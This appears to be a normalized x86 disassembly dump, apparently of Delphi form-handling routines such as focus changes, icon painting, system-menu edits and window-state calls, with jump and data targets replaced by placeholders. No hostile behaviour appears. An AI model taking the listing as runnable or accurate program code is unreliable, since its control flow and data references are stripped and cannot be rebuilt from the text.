push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_459918
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45991f
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
mov eax edi
call sub_455b0c
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403468
mov eax ebx
call sub_459c28
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403468
test al al
jne r-xdata
sub_459928
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_4411d4
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_4411d4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_459870
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_459970
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_459870
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_459994
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_413b0c
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_413a44
mov eax edi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_413b0c
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_413a44
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_459c04
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_4446f8
mov dx 0xb000
call sub_4558cc
test al al
jne r-xdata
call sub_4446f8
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_4558cc
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459c0b
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403aa4
jmp r-xdata
call sub_403aa4
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4411d4
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_4446f8
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_4558cc
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_43f0c4
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
call sub_403aa4
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_4446f8
mov dx 0xb01a
call sub_4558cc
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403aa4
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_43f0c4
sub_459c28
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_43f0c4
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_4446f8
push eax
call SetFocus
mov eax ebx
call sub_4446f8
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_459c78
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_43f0c4
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_459d2c
mov eax esi
call sub_459c28
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_444b20
mov edx eax
mov eax esi
call sub_459870
sub_459cdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4588f4
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_43f0c4
mov eax ebx
call sub_4588f4
mov edx esi
call sub_459cdc
sub_459d2c
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_4522d4
mov edx esi
call sub_4522b8
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_459dd4
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
sub_459e20
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_459dd4
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_459e50
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_459dd4
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_459ebc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41d2b4
xor eax eax
push ebp
push sub_459f6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_41d6a8
xor eax eax
push ebp
push sub_459f47
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403468
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459f4e
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_41d6a8
retn
sub_459f78
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_4588f4
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_458928
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403468
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_4439c0
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_458974
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403468
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_45a018
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4446f8
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_4446f8
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_459ea0
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_4446f8
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_442888
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_45a096
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_41ce94
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_45a0f8
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4446f8
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_442b4c
pop edi
pop esi
retn
sub_45a144
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4446f8
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_45a240
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_458c68
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_45a144
pop ecx
sub_45a274
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_43f5e0
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4446f8
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4446f8
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_4446f8
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_43e584
pop esi
pop ebx
retn
sub_45a304
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_44394c
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_4446f8
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_451cf4
sub_45a364
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_4429e8
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_451708
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_45a3b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_451f68
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_45a3e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_45a483
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a48a
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_451668
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45f1a4
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_43afd4
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45f1a4
jmp r-xdata
sub_45a4b0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403468
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_45a4f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40c8d0
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_45a51c
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_459cdc
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_43adac
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_45a574
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_443830
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45db58
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403468
sub_45a600
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_4446f8
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_4446f8
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_4446f8
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45a698
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4446f8
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_459c78
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403468
sub_45a6f0
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_444c2c
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_45a71c
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_459cdc
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_45a738
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_451698
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_451698
sub_45a778
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_45a7b0
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_404010
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_45a7e4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45a935
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a93c
lea eax [ ebp - 0x10 ]
call sub_403fbc
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_45a738
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_43ad50
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_41256c
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_43d9dc
lea eax [ ebp - 0x1c ]
call sub_406994
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_45a738
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_45a778
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_45ee48
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_45eeb0
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_45eeb0
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_45a7b0
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_41256c
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_43d9dc
lea eax [ ebp - 0x1c ]
call sub_406994
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_45ede0
test [ esi + 0x228 ] 0x8
je r-xdata
sub_45a944
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_45a9b8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_45a9e4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_442c94
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4589f4
lea edx [ ebp - 0x14 ]
call sub_45c1bc
push ebp
mov eax [ ebp - 0x4 ]
call sub_4589f4
lea edx [ ebp - 0x24 ]
call sub_45c1bc
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_45a9b8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_4589f4
lea edx [ ebp - 0x24 ]
call sub_45c1bc
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_45a9b8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_45a9b8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_45a9b8
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_45aa9c
push ebx
push esi
mov ebx eax
